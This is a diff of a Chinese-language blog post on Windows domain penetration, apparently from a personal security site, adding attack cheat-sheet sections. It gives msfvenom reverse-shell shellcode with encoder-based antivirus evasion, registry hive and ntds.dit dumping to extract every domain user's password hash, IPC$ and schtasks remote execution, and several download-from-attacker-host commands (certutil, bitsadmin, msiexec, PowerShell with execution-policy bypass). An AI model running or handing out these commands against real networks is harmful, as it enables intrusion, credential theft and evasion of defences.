@@ -35,20 +35,20 @@
 <p>如,对应的服务类型是什么,机器名是多少,服务端口是多少</p>
 <p>借助 SPN 快速定位当前目标域中所有存活的各类服务器</p>
 <h2 id="DNSDump"><a href="#DNSDump" class="headerlink" title="DNSDump"></a>DNSDump</h2><p>命令</p>
-<figure class="highlight dos"><table><tr><td class="code"><pre><span class="line">dnsdump.exe -u 域名\域用户 -p 域密码 域控机器名</span><br><span class="line">![dnsbump](domain/dnsdump1.png)</span><br></pre></td></tr></table></figure>
+<figure class="highlight dos"><table><tr><td class="code"><pre><span class="line">dnsdump.exe -u 域名\域用户 -p 域密码 域控机器名</span><br></pre></td></tr></table></figure>
 
+<p><img src="/2019/12/03/domain/dnsdump1.png" alt="dnsbump"></p>
 <h2 id="net"><a href="#net" class="headerlink" title="net"></a>net</h2><figure class="highlight dos"><table><tr><td class="code"><pre><span class="line"><span class="built_in">net</span> user /domain                       获取域用户列表</span><br><span class="line"><span class="built_in">net</span> group "domain admins" /domain      获取域管理员列表</span><br><span class="line"><span class="built_in">net</span> group "domain controllers" /domain 查看域控制器</span><br><span class="line"><span class="built_in">net</span> group "domain computers" /domain   查看与机器</span><br><span class="line"><span class="built_in">net</span> group /domain                      查询域里面的组</span><br><span class="line"><span class="built_in">net</span> view                               查看同一域内机器列表</span><br><span class="line"><span class="built_in">net</span> view \\ip                          查看某IP共享</span><br><span class="line"><span class="built_in">net</span> view \\GHQ                         查看GHQ计算机的共享资源列表</span><br><span class="line"><span class="built_in">net</span> view /domain                       查看内网存在多少个域</span><br><span class="line"><span class="built_in">net</span> view /domain:XYZ                   查看XYZ域中的机器列表</span><br></pre></td></tr></table></figure>
 
 <p><img src="/2019/12/03/domain/net1.png" alt="net"></p>
 <h2 id="2-6-nbtscan"><a href="#2-6-nbtscan" class="headerlink" title="2.6 nbtscan"></a>2.6 nbtscan</h2><figure class="highlight dos"><table><tr><td class="code"><pre><span class="line">nbtscan.exe ip段</span><br></pre></td></tr></table></figure>
 
 <p>有<code>DC</code>标识的主机即为<code>域控</code><br><img src="/2019/12/03/domain/nbtscan1.png" alt="nbtscan"></p>
-<h1 id="域渗透思路"><a href="#域渗透思路" class="headerlink" title="域渗透思路"></a>域渗透思路</h1><h2 id="整体思路"><a href="#整体思路" class="headerlink" title="整体思路"></a>整体思路</h2><p>横向渗透-&gt;权限维持-&gt;获取一个域用户的账号密码-&gt;域信息收集-&gt;横向渗透-&gt;获取密码-&gt;获取域管权限-&gt;拿下域控服务器</p>
+<h1 id="Part-3-域渗透思路"><a href="#Part-3-域渗透思路" class="headerlink" title="Part 3 域渗透思路"></a>Part 3 域渗透思路</h1><h2 id="整体思路"><a href="#整体思路" class="headerlink" title="整体思路"></a>整体思路</h2><p>横向渗透-&gt;权限维持-&gt;获取一个域用户的账号密码-&gt;域信息收集-&gt;横向渗透-&gt;获取密码-&gt;获取域管权限-&gt;拿下域控服务器</p>
 <h2 id="横向渗透思路"><a href="#横向渗透思路" class="headerlink" title="横向渗透思路"></a>横向渗透思路</h2><p>使用于工作组和域渗透<br><img src="/2019/12/03/domain/silu1.png" alt="silu"></p>
-<h2 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h2><p><code>dll</code>加载<code>shellcode</code>免杀上线</p>
+<h2 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h2><p><code>dll</code>加载<code>shellcode</code>免杀</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">msfvenom -a x86--platform Windows -p windows/meterpreter/reverse_tcp_uuid LPORT=9999 LHOST=192.168.1.1 -e</span><br><span class="line">x86/shikata_ga_nai -i 11 -f c -o shellcode.c</span><br><span class="line"></span><br><span class="line"><span class="meta">msf&gt;</span><span class="bash">use exploit/multi/handler</span></span><br><span class="line"></span><br><span class="line"><span class="meta">msf&gt;</span><span class="bash"><span class="built_in">set</span> payload windows/meterpreter/reverse_tcp_uuid</span></span><br><span class="line"></span><br><span class="line"><span class="meta">msf&gt;</span><span class="bash"><span class="built_in">set</span> lhost 192.168.1.1</span></span><br><span class="line"></span><br><span class="line"><span class="meta">msf&gt;</span><span class="bash"><span class="built_in">set</span> lport 9999</span></span><br><span class="line"></span><br><span class="line"><span class="meta">msf&gt;</span><span class="bash"><span class="built_in">set</span> EnableStageEncoding <span class="literal">true</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">msf&gt;</span><span class="bash"><span class="built_in">set</span> StageEncoder x86/fnsteny_mov</span></span><br><span class="line"></span><br><span class="line"><span class="meta">msf&gt;</span><span class="bash">exploit</span></span><br></pre></td></tr></table></figure>
 
-<p>待续</p>
 <h2 id="注册表读取密码"><a href="#注册表读取密码" class="headerlink" title="注册表读取密码"></a>注册表读取密码</h2><h3 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h3><p>导出 <code>HKLM\SYSTEM</code>和<code>\HKLM\SAM</code>后用<code>mimakatz</code>解密</p>
 <figure class="highlight d"><table><tr><td class="code"><pre><span class="line">reg save HKLM\SYSTEM</span><br><span class="line">c:\windows\temp\Sys.hiv</span><br><span class="line">reg save HKLM\SAM</span><br><span class="line">c:\windows\temp\Sam.hiv</span><br><span class="line"></span><br><span class="line"><span class="comment">//mimakatz 解密</span></span><br><span class="line">lsadump::sam /sam:Sam.hiv /system:Sys.hiv</span><br></pre></td></tr></table></figure>
 
@@ -65,11 +65,61 @@
 <ol>
 <li>目标管理员可能对服务器禁用远程登陆。</li>
 </ol>
-<p>前提是建立 IPC 连接</p>
-<p>可以访问目标机器的文件(上传、下载),也可以在目标机器上运行命令,</p>
-<p>上传和下载文件直接通过 copy 命令就可以,不过路径换成 UNC 路径,</p>
-<p>何为 UNC 路径?简单来讲以\开头的路径就是 UNC 路径,比如\192.168.1.2\cSAusers<br>如果要从本地当前目录上传 1.bat 到 192.168.1.2 机器 C 盘根目录下,</p>
-<p>那么命令就是 copy1.bat\192.168.1.2\C$\ 反之就是下载.<br>dir、copy、xcopy、move、type 的参数都可以使用 UNC 路径。</p>
+<h3 id="建立-IPC-连接"><a href="#建立-IPC-连接" class="headerlink" title="建立 IPC 连接"></a>建立 IPC 连接</h3><p><code>IPC连接</code>可以访问目标机器的文件(上传、下载),也可以在目标机器上运行命令</p>
+<p>建立<code>IPC连接</code><br><code>net use \\target_ip/u:domain\username password</code><br>删除<code>IPC连接</code><br><code>net use \\target_ip/u:domain /de /y</code><br>上传和下载文件直接通过 copy 命令就可以,不过路径换成 UNC 路径,</p>
+<p>何为 UNC 路径?简单来讲以\开头的路径就是 UNC 路径</p>
+<p>上传文件:</p>
+<p><code>copy file \\target_ip\path$</code></p>
+<p>下载文件:</p>
+<p><code>copy \\target_ip\path$\</code></p>
+<p>查看<code>dir</code>目录下的文件</p>
+<p><code>dir \\target_ip\path$\</code></p>
+<p>执行命令(明文|hash 传递)</p>
+<p><code>schtasks (计划任务)</code></p>
+<p>创建:</p>
+<p><code>schtasks create /tn taskname /u域\域用户 /p 域用户密码 /tr 执行的命令或者bat路径 /sc ONSTART /s 域主机IP /RU system</code></p>
+<p>运行:</p>
+<p><code>schtasks /run /tn taskname /s 域主机IP /u 域\域用户 /p 域用户密码</code></p>
+<p>删除:</p>
+<p><code>schtasks /F /delete /tn taskname /s 域主机IP /U 域\域用户 /p 域用户密码</code></p>
+<h3 id="paEXEC"><a href="#paEXEC" class="headerlink" title="paEXEC"></a>paEXEC</h3><p>待续</p>
+<h2 id="命令行下载文件"><a href="#命令行下载文件" class="headerlink" title="命令行下载文件"></a>命令行下载文件</h2><h3 id="powershell-win2003-xp-不支持"><a href="#powershell-win2003-xp-不支持" class="headerlink" title="powershell (win2003 xp 不支持)"></a>powershell (win2003 xp 不支持)</h3><figure class="highlight dos"><table><tr><td class="code"><pre><span class="line">powershell -exec bypass -c (new-object System.<span class="built_in">Net</span>.WebClient).Down1oadFile('http://<span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">101</span>/test.txt','C:\test.txt')</span><br></pre></td></tr></table></figure>
+
+<h3 id="Certutil"><a href="#Certutil" class="headerlink" title="Certutil"></a>Certutil</h3><figure class="highlight dos"><table><tr><td class="code"><pre><span class="line">Certutil.exe -urlcache -split -f http://<span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">1</span>/test.txt file.txt</span><br></pre></td></tr></table></figure>
+
+<h3 id="bitasdmin"><a href="#bitasdmin" class="headerlink" title="bitasdmin"></a>bitasdmin</h3><figure class="highlight dos"><table><tr><td class="code"><pre><span class="line">bitsadmin /rawreturn /transfer getfile http://<span class="number">192</span>.<span class="number">168</span>.<span class="number">3</span>.<span class="number">1</span>/test.txt E:\file\test.txt</span><br><span class="line">bitsadmin /rawreturn /transfer getpayload http://<span class="number">192</span>.<span class="number">168</span>.<span class="number">3</span>.<span class="number">1</span>/test.txt E:\file\test.txt</span><br></pre></td></tr></table></figure>
+
+<h3 id="msiexeC"><a href="#msiexeC" class="headerlink" title="msiexeC"></a>msiexeC</h3><figure class="highlight dos"><table><tr><td class="code"><pre><span class="line">msiexec /q /j http://<span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">1</span>/test.txt</span><br></pre></td></tr></table></figure>
+
+<h3 id="IEExec"><a href="#IEExec" class="headerlink" title="IEExec"></a>IEExec</h3><figure class="highlight dos"><table><tr><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Windows</span>\<span class="title">Microsoft.NET</span>\<span class="title">Framework</span>\<span class="title">v2</span>.0.50727&gt;<span class="title">caspol</span> -<span class="title">s</span> <span class="title">off</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">C</span>:\<span class="title">windows</span>\<span class="title">Microsoft.NET</span>\<span class="title">Framework</span>\<span class="title">v2</span>.0.50727&gt;<span class="title">IEExec.exe</span> <span class="title">http</span>://192.168.1.1/<span class="title">test.exe</span></span></span><br></pre></td></tr></table></figure>
+
+<h2 id="内网代理"><a href="#内网代理" class="headerlink" title="内网代理"></a>内网代理</h2><p>内网有些资源可能需要挂指定代理才可以访问,代理地址可以通过读取注册表获取,直接查询 HKEY_CURRENT_USER</p>
+<p>1.ie 代理</p>
+<figure class="highlight dos"><table><tr><td class="code"><pre><span class="line">req query "HKEY_CURRENT_USER\Software\Microsoft\windows\CurrentVersion\Internet Settings /v ProxyServer"</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2019/12/03/domain/dl_ie.png" alt="dlie"><br>2.pac 代理</p>
+<figure class="highlight dos"><table><tr><td class="code"><pre><span class="line">req query HKEY_CURRENT_USER\Software\Microsoft\windows\CurrentVersion\Internet Settings /v AutoConfigURL"</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2019/12/03/domain/dl_pac.png" alt="dlpac"></p>
+<h2 id="windows-api"><a href="#windows-api" class="headerlink" title="windows api"></a>windows api</h2><p>工具利用前提:建立<code>IPC</code>连接</p>
+<p>相关工具</p>
+<p><code>etGroupGetUser.exe</code> 查询域中各个组的成员,<code>IP</code>必须是<code>域控IP</code>，<code>域用户</code>随意。<br><img src="/2019/12/03/domain/api1.png" alt="api1"></p>
+<p><code>NetGroupGetMembers.exe</code> 查询目标服务器本地管理组的成员<br><img src="/2019/12/03/domain/api2.png" alt="api2"></p>
+<p><code>NetUserEnum.exe</code> 查询目标服务器中所有用户,包括隐藏用户<br><img src="/2019/12/03/domain/api3.png" alt="api3"></p>
+<h2 id="导域-hash"><a href="#导域-hash" class="headerlink" title="导域 hash"></a>导域 hash</h2><p><code>windows</code>的密码是经过<code>hash</code>后存储的,本地存在<code>HKLM\sam</code>,<code>HKLM\system</code>注册表中,域里面存在域控制器的<code>c:\windows\ntds\ntds.dit</code>中<br><code>ntds.dit</code>其实就是个<code>esent</code>数据库,微软本身就有一系列的 API 能够操作这个数据库。可以利用快照导出<code>ntds.dit</code>.</p>
+<p>创建快照:</p>
+<p><code>ntdsutil snapshot &quot;activate instance ntds&quot; create quit quit</code></p>
+<p><img src="/2019/12/03/domain/kz_create.png" alt="kz_create"></p>
+<p>挂载快照:<br><code>ntdsutil snapshot &quot;mount {id} quit quit&quot;</code><br><img src="/2019/12/03/domain/kz_mount.png" alt="KZ_MOUNT"></p>
+<p>复制<code>ntds.dit</code>:</p>
+<p><code>copy C:\$SNAP xxxxxx VOLUMEC$\windows\NTDS\ntds.dit path</code></p>
+<p><img src="/2019/12/03/domain/copy_dit.png" alt="copy_dit"></p>
+<p>卸载快照<br><code>ntdsutil snapshot &quot;unmount {id} quit quit&quot;</code><br><img src="/2019/12/03/domain/kz_unmount.png" alt="kz_unmount"></p>
+<p>删除快照<br><code>ntdsutil snapshot &quot;delete {id} quit quit&quot;</code><br><img src="/2019/12/03/domain/kz_delete.png" alt="kz_delete"></p>
+<p>获取解密秘钥<code>KEY</code><br><code>reg save HKLM\SYSTEM\ path</code><br><img src="/2019/12/03/domain/get_key.png" alt="get_key"></p>
+<p>使用<code>NTDSDumpEx</code>获取所有域用户的<code>hash</code><br><code>NTDSDumpEx.exe -d ntds.dit -o hash.txt -s keypath</code></p>
+<p><img src="/2019/12/03/domain/ntdsdumpex.png" alt="NTDSDumpEx"></p>
+<p><img src="/2019/12/03/domain/ntds_res.png" alt="ntds_res"></p>
 ]]></content>
       <tags>
         <tag>内网渗透</tag>
